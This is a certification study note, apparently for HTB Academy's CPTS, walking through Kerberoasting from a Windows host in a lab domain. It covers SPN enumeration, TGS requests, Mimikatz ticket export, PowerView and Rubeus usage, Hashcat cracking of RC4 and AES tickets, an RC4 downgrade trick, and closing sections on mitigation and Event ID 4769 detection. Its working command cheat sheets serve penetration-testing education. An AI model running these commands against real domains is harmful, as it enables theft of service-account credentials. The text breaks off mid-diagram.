# 🔥 Kerberoasting — From Windows

> [!info] 🎯 What This Section Teaches  
> This section covers **Kerberoasting from a Windows attack host**, starting with the older/semi-manual approach and progressing to automated tooling.
> 
> The overall objective remains the same:
> 
> **Find accounts with SPNs → request TGS tickets → extract the ticket material → convert to a crackable format → crack offline → validate/reuse recovered credentials.**
> 
> The major difference is **where and how the TGS is obtained**.
> 
> ```text
> Windows Domain User
>        │
>        ▼
> Enumerate SPNs
>        │
>        ├── setspn.exe
>        ├── PowerView
>        └── Rubeus
>        │
>        ▼
> Identify interesting service accounts
>        │
>        ▼
> Request TGS
>        │
>        ├── .NET KerberosRequestorSecurityToken
>        ├── PowerView
>        └── Rubeus
>        │
>        ▼
> Extract ticket material
>        │
>        ├── Mimikatz → .kirbi
>        └── Rubeus/PowerView → Hashcat format
>        │
>        ▼
> Offline cracking
>        │
>        └── Hashcat
>        │
>        ▼
> Recovered service-account password
> ```

---

# 🧾 1. Command Cheat Sheet

| Command                                                                                                                                                                                                      | What it does                                                                                                |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------- |
| `setspn.exe -Q */*`                                                                                                                                                                                          | Queries the domain for accounts/objects with registered SPNs.                                               |
| `setspn.exe -T INLANEFREIGHT.LOCAL -Q */*`                                                                                                                                                                   | Searches for SPNs specifically within the target domain.                                                    |
| `Add-Type -AssemblyName System.IdentityModel`                                                                                                                                                                | Loads the .NET `System.IdentityModel` assembly into the PowerShell session.                                 |
| `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN"`                                                                                                                  | Creates a Kerberos requestor token and causes a TGS request for the supplied SPN.                           |
| `setspn.exe -T INLANEFREIGHT.LOCAL -Q */* \| Select-String '^CN' -Context 0,1 \| % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }` | Enumerates SPNs and requests Kerberos tickets for the discovered SPNs.                                      |
| `kerberos::list /export`                                                                                                                                                                                     | Mimikatz command that lists Kerberos tickets and exports them as `.kirbi` files.                            |
| `base64 /out:true`                                                                                                                                                                                           | Configures Mimikatz to output extracted ticket data as Base64.                                              |
| `echo "<base64 blob>" \| tr -d \\n`                                                                                                                                                                          | Removes newline characters from a Base64 ticket blob so it becomes one continuous line.                     |
| `cat encoded_file \| base64 -d > sqldev.kirbi`                                                                                                                                                               | Decodes a Base64 ticket and writes it to a `.kirbi` file.                                                   |
| `python2.7 kirbi2john.py sqldev.kirbi`                                                                                                                                                                       | Extracts crackable Kerberos ticket material from a `.kirbi` file.                                           |
| `sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat`                                                                                                                | Reformats the extracted ticket material into the Hashcat RC4 TGS format.                                    |
| `cat sqldev_tgs_hashcat`                                                                                                                                                                                     | Displays the prepared Hashcat-compatible Kerberos hash.                                                     |
| `hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt`                                                                                                                                       | Cracks Kerberos 5 etype 23 TGS-REP hashes using Hashcat mode `13100`.                                       |
| `Import-Module .\PowerView.ps1`                                                                                                                                                                              | Loads PowerView into the current PowerShell session.                                                        |
| `Get-DomainUser * -spn \| select samaccountname`                                                                                                                                                             | Enumerates domain users that have an SPN.                                                                   |
| `Get-DomainUser -Identity sqldev \| Get-DomainSPNTicket -Format Hashcat`                                                                                                                                     | Requests the TGS for `sqldev` and directly formats it for Hashcat.                                          |
| `Get-DomainUser * -SPN \| Get-DomainSPNTicket -Format Hashcat \| Export-Csv .\ilfreight_tgs.csv -NoTypeInformation`                                                                                          | Requests TGS tickets for SPN accounts and exports the results to CSV.                                       |
| `cat .\ilfreight_tgs.csv`                                                                                                                                                                                    | Displays the exported ticket information.                                                                   |
| `.\Rubeus.exe`                                                                                                                                                                                               | Displays Rubeus functionality/help.                                                                         |
| `.\Rubeus.exe kerberoast /stats`                                                                                                                                                                             | Enumerates Kerberoastable accounts and displays statistics without requesting tickets.                      |
| `.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap`                                                                                                                                                 | Kerberoasts accounts matching `admincount=1` and prevents output from being wrapped across lines.           |
| `.\Rubeus.exe kerberoast /user:testspn /nowrap`                                                                                                                                                              | Kerberoasts a specific user and outputs the hash without wrapping.                                          |
| `.\Rubeus.exe kerberoast /tgtdeleg /nowrap`                                                                                                                                                                  | Requests service tickets using the `tgtdeleg` technique and attempts to obtain RC4 tickets where supported. |
| `Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes`                                                                                                       | Checks a user's SPN and supported Kerberos encryption-type configuration.                                   |
| `hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt`                                                                                                                                             | Cracks Kerberos 5 etype 18 TGS-REP hashes using Hashcat mode `19700`.                                       |
| `s`                                                                                                                                                                                                          | Hashcat interactive status command while a cracking job is running.                                         |

---

# 🛠️ 2. Tool Roles & Differences

|Tool|Primary Role|Where It Fits|
|---|---|---|
|[`setspn.exe`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/setspn)|Enumerates SPNs|Discover potential Kerberoasting targets|
|.NET `KerberosRequestorSecurityToken`|Requests TGS tickets|Manual/semi-manual ticket requesting|
|[`Mimikatz`](https://github.com/gentilkiwi/mimikatz)|Extracts Kerberos tickets from memory|Turn requested tickets into `.kirbi` files|
|[`kirbi2john.py`](https://github.com/nidem/kerberoast/blob/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py)|Converts `.kirbi` material into crackable data|Offline ticket preparation|
|[`PowerView`](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)|AD enumeration + TGS extraction|Faster PowerShell-based Kerberoasting|
|[`Rubeus`](https://github.com/GhostPack/Rubeus)|Kerberos interaction and Kerberoasting|Automated Kerberoasting and advanced Kerberos operations|
|[`Hashcat`](https://hashcat.net/hashcat/)|Offline password cracking|Recover the service-account password|

> [!important] 🧠 The Big Difference  
> The **manual method** makes you understand every stage:
> 
> ```text
> SPN
>  ↓
> TGS request
>  ↓
> Ticket in memory
>  ↓
> Mimikatz
>  ↓
> .kirbi
>  ↓
> kirbi2john
>  ↓
> Hashcat format
>  ↓
> Hashcat
> ```
> 
> Whereas the automated tools collapse several of those steps:
> 
> ```text
> PowerView
>     └── SPN enumeration + TGS request + Hashcat formatting
> 
> Rubeus
>     └── SPN enumeration + TGS request + Hash output
> ```

---

# 🔎 3. Enumerating SPNs with `setspn.exe`

The first step is to identify accounts with **Service Principal Names (SPNs)**.

```cmd
setspn.exe -Q */*
```

Example:

```text
Checking domain DC=INLANEFREIGHT,DC=LOCAL

CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        backupjob/veam001.inlanefreight.local

CN=SOLARWINDSMONITOR,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        sts/inlanefreight.local

CN=sqlprod,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SPSJDB.inlanefreight.local:1433

CN=sqlqa,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SQL-CL01-01inlanefreight.local:49351

CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433

CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        adfsconnect/azure01.inlanefreight.local
```

### 🧠 What are we looking for?

The output contains SPNs belonging to both:

- **Computer accounts**
    
- **User/service accounts**
    

For Kerberoasting, our focus is generally on **user accounts configured with SPNs**, because their TGS tickets can be targeted for offline password cracking.

For example:

```text
sqldev
   │
   └── MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
```

This tells us:

- Account: `sqldev`
    
- Service: `MSSQLSvc`
    
- Host: `DEV-PRE-SQL.inlanefreight.local`
    
- Port: `1433`
    

> [!tip] CPTS Mental Model  
> Don't think:
> 
> **"I found an SPN, therefore I found a password."**
> 
> Think:
> 
> **"I found an account whose Kerberos service ticket can potentially give me offline password-cracking material."**

---

# 🎫 4. Semi-Manual TGS Request with PowerShell

After finding an interesting SPN, we can request its TGS using built-in .NET functionality.

First:

```powershell
Add-Type -AssemblyName System.IdentityModel
```

This loads the `.NET` `System.IdentityModel` assembly into the current PowerShell session.

Then:

```powershell
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

Example output:

```text
Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-2
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:36:22 PM
ValidTo              : 2/25/2022 8:55:25 AM
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
```

### 🔬 What is actually happening?

```text
Current Windows logon session
          │
          ▼
KerberosRequestorSecurityToken
          │
          │ SPN supplied
          ▼
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
          │
          ▼
Domain Controller / KDC
          │
          ▼
TGS for that service
          │
          ▼
Ticket stored in the current logon session
```

The important part is that the ticket is now available in the current Windows session's Kerberos ticket cache/memory.

> [!important] Key Concept  
> `KerberosRequestorSecurityToken` is **not cracking anything**.
> 
> It is simply causing the Windows host to request a Kerberos **TGS** for the supplied SPN.
> 
> The cracking happens **later and offline**.

---

# 🔁 5. Requesting Tickets for All SPNs

Instead of manually requesting one ticket at a time, the source combines `setspn.exe` with the PowerShell object creation:

```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* |
Select-String '^CN' -Context 0,1 |
% {
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken `
    -ArgumentList $_.Context.PostContext[0].Trim()
}
```

Conceptually:

```text
setspn.exe
    │
    └── Find SPNs
          │
          ▼
Select-String
    │
    └── Extract relevant lines
          │
          ▼
KerberosRequestorSecurityToken
    │
    └── Request TGS
          │
          ▼
Tickets loaded into memory
```

Example output includes:

```text
ServicePrincipalName : exchangeAB/ACADEMY-EA-DC01
ServicePrincipalName : kadmin/changepw
ServicePrincipalName : WSMAN/ACADEMY-EA-MS01
...
```

> [!warning] ⚠️ Why This Is Not Always Ideal  
> Requesting everything also requests tickets for **computer accounts and other less-interesting SPNs**.
> 
> In a real assessment, you generally want to reduce unnecessary requests and focus on **interesting user/service accounts**.

---

# 🧠 6. The Ticket Is Now in Memory — What Next?

At this point:

```text
SPN discovered
      ↓
TGS requested
      ↓
TGS loaded into memory
```

But we still need to **extract the ticket**.

This is where Mimikatz comes in.

---

# 🥷 7. Extracting Tickets with Mimikatz

Mimikatz can list and export Kerberos tickets:

```text
mimikatz # kerberos::list /export
```

The resulting ticket can be written to:

```text
.kirbi
```

Example:

```text
Server Name : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL
Client Name : htb-student @ INLANEFREIGHT.LOCAL
```

This is useful because it tells us:

```text
Client:
    htb-student

Requested service:
    MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433

Domain:
    INLANEFREIGHT.LOCAL
```

The ticket is associated with the **service account behind that SPN**, which is what ultimately makes the ticket useful for Kerberoasting.

---

# 📦 8. Two Ways to Extract the Ticket

Mimikatz can output the ticket directly as a `.kirbi` file:

```text
mimikatz # kerberos::list /export
```

Or it can output the ticket as Base64.

The source uses:

```text
mimikatz # base64 /out:true
```

followed by:

```text
mimikatz # kerberos::list /export
```

### Method A — Direct `.kirbi`

```text
Mimikatz
   │
   ▼
kerberos::list /export
   │
   ▼
ticket.kirbi
```

### Method B — Base64

```text
Mimikatz
   │
   ▼
Base64 ticket
   │
   ▼
remove line wrapping
   │
   ▼
Base64 decode
   │
   ▼
ticket.kirbi
```

> [!tip] Practical Difference  
> If you can easily transfer files from the Windows host to your attack machine, the direct `.kirbi` method is simpler.
> 
> If moving files is inconvenient, Base64 output can make transferring the ticket contents easier.

---

# 🧹 9. Preparing the Base64 Blob

Mimikatz's Base64 output is column-wrapped.

Hash/ticket-processing tools need the Base64 data as one continuous line.

Use:

```bash
echo "<base64 blob>" | tr -d \\n
```

Conceptually:

```text
Original:

AAAAAA
BBBBBB
CCCCCC

        ↓

Remove newline characters

        ↓

AAAAAABBBBBBCCCCCC
```

Then save it and decode it:

```bash
cat encoded_file | base64 -d > sqldev.kirbi
```

Now:

```text
encoded_file
     │
     ▼
base64 -d
     │
     ▼
sqldev.kirbi
```

---

# 🔓 10. Converting `.kirbi` with `kirbi2john.py`

The `.kirbi` file is not yet in the format Hashcat expects.

Use:

```bash
python2.7 kirbi2john.py sqldev.kirbi
```

This creates:

```text
crack_file
```

The source then modifies that output into the Hashcat-compatible RC4 TGS format.

```bash
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

Then:

```bash
cat sqldev_tgs_hashcat
```

The resulting format begins with:

```text
$krb5tgs$23$*
```

That `23` is important.

---

# 🔢 11. Understanding `$krb5tgs$23$`

The number identifies the Kerberos encryption type.

|Hash Prefix|Kerberos Type|Encryption|
|---|--:|---|
|`$krb5tgs$23$`|23|RC4-HMAC|
|`$krb5tgs$17$`|17|AES128|
|`$krb5tgs$18$`|18|AES256|

The source focuses heavily on the difference between **RC4** and **AES** because encryption type has a major effect on offline cracking speed.

---

# 💥 12. Cracking the TGS with Hashcat

For RC4 TGS-REP:

```bash
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

Hashcat mode:

```text
13100
```

means:

```text
Kerberos 5, etype 23, TGS-REP
```

The source successfully recovered:

```text
database!
```

So the attack chain becomes:

```text
sqldev SPN
    ↓
TGS requested
    ↓
TGS extracted
    ↓
.kirbi
    ↓
kirbi2john.py
    ↓
Hashcat format
    ↓
Hashcat -m 13100
    ↓
database!
```

> [!success] 🎯 Important CPTS Point  
> Kerberoasting is powerful because the **actual password does not need to be guessed against the domain controller**.
> 
> Once you have the TGS material, password guessing happens **offline**.
> 
> That means:
> 
> ```text
> Domain Controller
>       │
>       └── TGS obtained once
> 
> Attack Host
>       │
>       └── Millions of password guesses offline
> ```
> 
> This is fundamentally different from repeatedly attempting authentication against the domain.

---

# ⚡ 13. PowerView — Automated Kerberoasting

The manual process teaches the underlying mechanics, but PowerView makes the workflow considerably shorter.

Load PowerView:

```powershell
Import-Module .\PowerView.ps1
```

Enumerate SPN accounts:

```powershell
Get-DomainUser * -spn | select samaccountname
```

Example:

```text
samaccountname
--------------
adfs
backupagent
krbtgt
sqldev
sqlprod
sqlqa
solarwindsmonitor
```

Now we have a clean list of potential Kerberoasting targets.

---

# 🎯 14. PowerView — Target One User

For example:

```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

PowerView handles several stages for us:

```text
Get-DomainUser
      │
      └── Find sqldev
             │
             ▼
Get-DomainSPNTicket
             │
             ├── Request TGS
             └── Format ticket
                    │
                    ▼
              Hashcat format
```

The result contains:

```text
SamAccountName       : sqldev
DistinguishedName    : ...
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
Hash                 : $krb5tgs$23$...
```

This means we no longer have to manually perform:

```text
TGS request
   ↓
Mimikatz
   ↓
.kirbi
   ↓
kirbi2john
   ↓
sed conversion
```

PowerView can give us the **Hashcat-compatible representation directly**.

---

# 📄 15. Exporting All Tickets to CSV

PowerView can also process all SPN accounts:

```powershell
Get-DomainUser * -SPN |
Get-DomainSPNTicket -Format Hashcat |
Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

Then inspect the file:

```powershell
cat .\ilfreight_tgs.csv
```

The CSV contains fields such as:

```text
SamAccountName
DistinguishedName
ServicePrincipalName
TicketByteHexStream
Hash
```

This is useful because it gives us a structured collection of:

```text
Account
   +
SPN
   +
TGS hash
```

that can be taken offline for cracking.

---

# 🐰 16. Rubeus — The Faster Kerberos Route

[`Rubeus`](https://github.com/GhostPack/Rubeus) is specifically designed for interacting with Kerberos from Windows.

It provides many Kerberos capabilities, including:

- Kerberoasting
    
- Alternate credentials
    
- Existing TGT usage
    
- Ticket manipulation
    
- Encryption-type control
    
- Filtering targets
    
- Output formatting
    
- Operational options
    

Basic Kerberoasting syntax:

```text
Rubeus.exe kerberoast
```

Target a specific SPN:

```text
Rubeus.exe kerberoast /spn:"blah/blah"
```

Target a specific user:

```text
Rubeus.exe kerberoast /user:USER
```

Specify a domain:

```text
Rubeus.exe kerberoast /domain:DOMAIN
```

Specify a domain controller:

```text
Rubeus.exe kerberoast /dc:DOMAIN_CONTROLLER
```

Output hashes to a file:

```text
Rubeus.exe kerberoast /outfile:hashes.txt
```

Output in a simpler file-like format:

```text
Rubeus.exe kerberoast /simple
```

Use alternate credentials:

```text
Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD
```

Use an existing TGT:

```text
Rubeus.exe kerberoast /ticket:BASE64
```

or:

```text
Rubeus.exe kerberoast /ticket:FILE.KIRBI
```

Use `tgtdeleg`:

```text
Rubeus.exe kerberoast /usetgtdeleg
```

Perform statistics-only enumeration:

```text
Rubeus.exe kerberoast /stats
```

Filter for administrative accounts:

```text
Rubeus.exe kerberoast /ldapfilter:'admincount=1'
```

Specify password age boundaries:

```text
Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5
```

Introduce delay/jitter:

```text
Rubeus.exe kerberoast /delay:5000 /jitter:30
```

Perform AES Kerberoasting:

```text
Rubeus.exe kerberoast /aes
```

---

# 📊 17. Rubeus `/stats` — Enumerate Before Requesting Tickets

One particularly useful option is:

```powershell
.\Rubeus.exe kerberoast /stats
```

The important part is:

```text
[*] Listing statistics about target users, no ticket requests being performed.
```

The example shows:

```text
Total kerberoastable users : 9
```

and:

```text
Supported Encryption Type
RC4_HMAC_DEFAULT                                  7
AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96  2
```

It also shows:

```text
Password Last Set Year
2022    9
```

### 🧠 Why `/stats` matters

It allows us to **survey the targets before requesting tickets**.

Instead of immediately doing:

```text
Request everything
```

we can first ask:

```text
How many Kerberoastable accounts exist?
How many support RC4?
How many use AES?
When were their passwords last changed?
```

Mental model:

```text
/stats
  │
  ├── How many targets?
  ├── Encryption types?
  └── Password age?
        │
        ▼
Choose interesting targets
        │
        ▼
Request tickets
        │
        ▼
Crack offline
```

---

# 👑 18. Targeting `admincount=1`

Rubeus can filter LDAP results:

```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

The result showed:

```text
Total kerberoastable users : 3
```

The reason this is interesting is that `admincount=1` is associated with accounts that have been protected/marked due to membership in certain privileged groups.

The source therefore uses it as a way to narrow the initial cracking targets.

> [!important] CPTS Target-Prioritization Mental Model  
> If you discover:
> 
> ```text
> 50 SPN accounts
> ```
> 
> you don't necessarily need to blindly request and crack every ticket immediately.
> 
> You can collect attributes and prioritize:
> 
> ```text
> SPN account
>      │
>      ├── Privileged/admin-related?
>      ├── RC4?
>      ├── AES?
>      ├── Password age?
>      └── Interesting service?
>             │
>             ▼
>       Decide what to request/crack
> ```

---

# 📏 19. `/nowrap` — Why It Matters

Rubeus can output the hash without wrapping:

```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

Without `/nowrap`, long ticket/hash material may be displayed across multiple lines.

With:

```text
/nowrap
```

the output remains on one line.

### Without `/nowrap`

```text
$krb5tgs$23$*user$DOMAIN$SPN*$
AAAAAAA...
BBBBBBB...
CCCCCCC...
```

### With `/nowrap`

```text
$krb5tgs$23$*user$DOMAIN$SPN*$AAAAAAA...BBBBBBB...CCCCCCC...
```

> [!tip] Practical Reason  
> Hashcat wants the hash as a single correctly formatted value.
> 
> `/nowrap` therefore removes unnecessary cleanup when copying the hash from a Windows host to your attack machine.

---

# 🔐 20. Kerberos Encryption Types

Encryption type is one of the most important concepts in this section.

The source highlights:

```text
RC4  → type 23
AES128 → type 17
AES256 → type 18
```

|Hashcat Prefix|Kerberos EType|Description|Relative Cracking Difficulty|
|---|--:|---|---|
|`$krb5tgs$23$`|23|RC4-HMAC|Lower|
|`$krb5tgs$17$`|17|AES128|Higher|
|`$krb5tgs$18$`|18|AES256|Higher|

> [!important] Core Idea  
> The encryption type does **not** determine whether Kerberoasting is possible.
> 
> It affects **how difficult the resulting ticket is to crack offline**.

---

# 🟥 21. RC4 Kerberoasting

For RC4, the ticket commonly begins:

```text
$krb5tgs$23$*
```

Hashcat uses:

```text
-m 13100
```

Example:

```bash
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
```

The source's example recovered:

```text
welcome1
```

in approximately:

```text
4 seconds
```

on the CPU used in the lab.

> [!warning] Don't Generalize the Exact Time  
> The source's cracking time is specific to its hardware, password, Hashcat version, and wordlist position.
> 
> The important lesson is the **relative difference between RC4 and AES**, not the exact number of seconds.

---

# 🔵 22. Checking `msDS-SupportedEncryptionTypes`

PowerView can show the account's supported encryption types:

```powershell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

Example:

```text
serviceprincipalname                   msds-supportedencryptiontypes samaccountname
-----------------------------         ----------------------------- --------------
testspn/kerberoast.inlanefreight.local 0                            testspn
```

The source explains:

```text
0 = encryption type not explicitly defined
```

and in the demonstrated configuration this resulted in:

```text
RC4_HMAC_MD5
```

---

# 🔵 23. AES Configuration

The source then changes the account to support AES:

```text
msDS-SupportedEncryptionTypes = 24
```

PowerView:

```powershell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

Output:

```text
serviceprincipalname                   msds-supportedencryptiontypes samaccountname
-----------------------------         ----------------------------- --------------
testspn/kerberoast.inlanefreight.local 24                           testspn
```

The resulting Rubeus output shows:

```text
Supported ETypes :
AES128_CTS_HMAC_SHA1_96,
AES256_CTS_HMAC_SHA1_96
```

and the resulting hash begins:

```text
$krb5tgs$18$
```

That means:

```text
18 = AES256
```

---

# 🧮 24. AES256 Hashcat Mode

For Kerberos 5 etype 18 / AES256 TGS-REP, the source uses:

```bash
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
```

Hashcat mode:

```text
19700
```

represents:

```text
Kerberos 5, etype 18, TGS-REP
AES256-CTS-HMAC-SHA1-96
```

The source's CPU example showed approximately:

```text
10,000 H/s
```

and estimated roughly:

```text
22+ minutes
```

to process the complete `rockyou.txt` list.

The eventual crack took:

```text
4 minutes 36 seconds
```

for the particular weak password used in the lab.

Compare that with the RC4 example:

```text
RC4  → ~4 seconds
AES256 → ~4 minutes 36 seconds
```

> [!important] 🧠 CPTS Takeaway  
> The point isn't:
> 
> **"AES means impossible."**
> 
> The point is:
> 
> **AES makes offline password guessing substantially more expensive, especially when the password itself is strong.**

---

# 🔄 25. `/tgtdeleg` and RC4 Downgrade

Rubeus provides:

```text
/tgtdeleg
```

The source demonstrates this as a way to request RC4 service tickets in environments where the target account supports AES.

Conceptually:

```text
Normal request:

Client
  │
  └── "I support AES"
          ↓
      AES TGS
```

With the demonstrated downgrade technique:

```text
Client
  │
  └── "Request RC4"
          ↓
      RC4 TGS
```

This can potentially make offline cracking considerably faster.

The source notes that this behavior depends on the **Domain Controller version**.

### Important source-specific distinction

The module states that:

- On **Windows Server 2019 DCs**, the demonstrated downgrade does not work as described.
    
- The DC will return the highest encryption level supported by the target account.
    
- On **Windows Server 2016 or earlier**, the demonstrated RC4 downgrade can work in the described circumstances.
    

Therefore:

```text
Server 2019 DC
    │
    └── AES-enabled account
           ↓
        AES ticket

Older DC
    │
    └── AES-enabled account
           ↓
        RC4 may be requestable
```

> [!warning] Version Matters  
> Do not memorize:
> 
> `AES account = always AES ticket`
> 
> or:
> 
> `tgtdeleg = always RC4`
> 
> The Domain Controller version and Kerberos configuration matter.

---

# ⚙️ 26. Kerberos Encryption Policy

The source also explains that Kerberos encryption types can be controlled through Group Policy.

Path:

```text
Computer Configuration
  >
Policies
  >
Windows Settings
  >
Security Settings
  >
Local Policies
  >
Security Options
  >
Network security: Configure encryption types allowed for Kerberos
```

The source notes that removing all encryption types except:

```text
RC4_HMAC_MD5
```

could allow the demonstrated downgrade behavior even on Server 2019.

However:

> [!warning] Security Warning  
> Removing AES support introduces a security weakness and should not be treated as a Kerberoasting "fix."
> 
> Likewise, disabling RC4 can have compatibility/operational consequences and should be thoroughly tested.

---

# 🛡️ 27. Mitigation

The source identifies several defensive approaches.

## 🔑 Strong Service-Account Passwords

For unmanaged service accounts:

```text
Long + complex password
        +
Not present in wordlists
        ↓
Much harder offline cracking
```

The core principle is:

> A TGS can be obtained, but if the password is sufficiently strong, offline cracking may be impractical.

---

## 🤖 Managed Service Accounts

The source recommends using:

- **Managed Service Accounts (MSA)**
    
- **Group Managed Service Accounts (gMSA)**
    
- Accounts using **LAPS** where applicable
    

These approaches reduce exposure to manually managed, weak, static service-account passwords.

The key benefit of managed service accounts in this context is:

```text
Complex password
       +
Automatic password rotation
       ↓
Reduced Kerberoasting password-cracking exposure
```

---

# 🚨 28. Detection

Kerberoasting generates Kerberos service-ticket activity.

The source explains that defenders can monitor:

```text
TGS-REQ
   ↓
TGS-REP
```

and look for unusual patterns.

Domain Controllers can be configured to audit Kerberos service ticket operations using:

```text
Audit Kerberos Service Ticket Operations
```

Relevant Windows Security Event IDs include:

|Event ID|Meaning|
|--:|---|
|`4769`|A Kerberos service ticket was requested|
|`4770`|A Kerberos service ticket was renewed|

The source gives an approximate baseline:

```text
10–20 TGS requests
for a given account
can be normal in some environments.
```

Therefore, a large burst of `4769` events from one account in a short time can be suspicious.

> [!important] Detection Mental Model
> 
> ```text
> Normal environment
>      │
>      └── Service tickets requested as applications need them
> 
> Possible Kerberoasting
>      │
>      └── One account suddenly requests many TGS tickets
>                  │
>                  ▼
>             Many 4769 events
> ```
> 
> The actual baseline is environment-dependent, so defenders need to understand normal Kerberos activity before treating a number as malicious.

---

# 🔍 29. Understanding Event ID 4769

The source's example shows:

```text
Requester:
    htb-student

Target service:
    sqldev
```

and the ticket encryption type:

```text
0x17
```

which corresponds to decimal:

```text
23
```

and therefore:

```text
RC4
```

This provides defenders with useful context:

```text
4769
 │
 ├── Who requested the ticket?
 │      └── htb-student
 │
 ├── Which service?
 │      └── sqldev
 │
 └── Which encryption type?
        └── RC4 / 23
```

A burst of such events can provide evidence that someone is requesting large numbers of service tickets.

---

# 🧠 30. The Complete Windows Kerberoasting Mental Model

There are essentially **three levels of approach** in this section.

## 🥉 Level 1 — Semi-Manual

```text
setspn.exe
    ↓
Find SPN
    ↓
KerberosRequestorSecurityToken
    ↓
TGS in memory
    ↓
Mimikatz
    ↓
.kirbi
    ↓
kirbi2john.py
    ↓
Hashcat format
    ↓
Hashcat
```

This is valuable for understanding the mechanics.

---

## 🥈 Level 2 — PowerView

```text
PowerView
    │
    ├── Get-DomainUser * -spn
    │       ↓
    │   Find SPN accounts
    │
    └── Get-DomainSPNTicket
            ↓
        Request TGS
            ↓
        Hashcat format
            ↓
        Hashcat
```

This removes a lot of manual processing.

---

## 🥇 Level 3 — Rubeus

```text
Rubeus
   │
   ├── Enumerate
   ├── Filter
   ├── Request TGS
   ├── Select/consider encryption types
   ├── Format output
   └── Save hashes
            │
            ▼
         Hashcat
```

This is the most feature-rich approach discussed in this section.

---

# 🗺️ 31. CPTS Decision Tree

```text
You have a Windows domain foothold
            │
            ▼
Do you have a valid domain session?
            │
            ├── NO → Kerberoasting from this position may require
            │         another authentication method/position
            │
            └── YES
                 │
                 ▼
          Enumerate SPNs
                 │
                 ├── setspn.exe
                 ├── PowerView
                 └── Rubeus /stats
                 │
                 ▼
       Identify user/service accounts
                 │
                 ▼
       Which targets are interesting?
                 │
                 ├── Privileged/admin-related
                 ├── RC4-supported
                 ├── Older password
                 └── Interesting service
                 │
                 ▼
          Request TGS
                 │
                 ├── Manual .NET method
                 ├── PowerView
                 └── Rubeus
                 │
                 ▼
        What encryption type?
                 │
          ┌──────┴───────┐
          ▼              ▼
        RC4             AES
     Type 23          Type 17/18
          │              │
          ▼              ▼
    Hashcat 13100   Hashcat 19700
          │              │
          └──────┬───────┘
                 ▼
          Offline cracking
                 │
          ┌──────┴───────┐
          ▼              ▼
       Cracked         Not cracked
          │              │
          ▼              ▼
 Recover password    Consider password
          │           strength / wordlist /
          ▼           encryption / target
 Validate credentials
          │
          ▼
 Continue AD methodology
```

---

# 🔄 32. Manual vs Automated Workflow

|Stage|Manual|PowerView|Rubeus|
|---|---|---|---|
|Find SPNs|`setspn.exe`|`Get-DomainUser * -spn`|`kerberoast /stats` / `kerberoast`|
|Request TGS|.NET class|`Get-DomainSPNTicket`|`kerberoast`|
|Extract ticket|Mimikatz|PowerView handles it|Rubeus handles it|
|`.kirbi` processing|`kirbi2john.py`|Not normally needed|Not normally needed|
|Hashcat formatting|`sed`|Direct Hashcat format|Direct Hashcat format|
|Filtering|Manual|PowerShell filtering|LDAP filters/options|
|Encryption awareness|Manual inspection|Enumeration|Built-in output|
|Output handling|Multiple steps|CSV/hash output|`/outfile`, `/nowrap`|
|Advanced Kerberos options|Limited|Moderate|Extensive|

---

# 🧩 33. What You Should Actually Remember for CPTS

> [!important] 🧠 Don't Memorize the Manual Chain as a Set of Random Commands
> 
> Understand the **data transformation**:
> 
> ```text
> SPN
>  ↓
> TGS
>  ↓
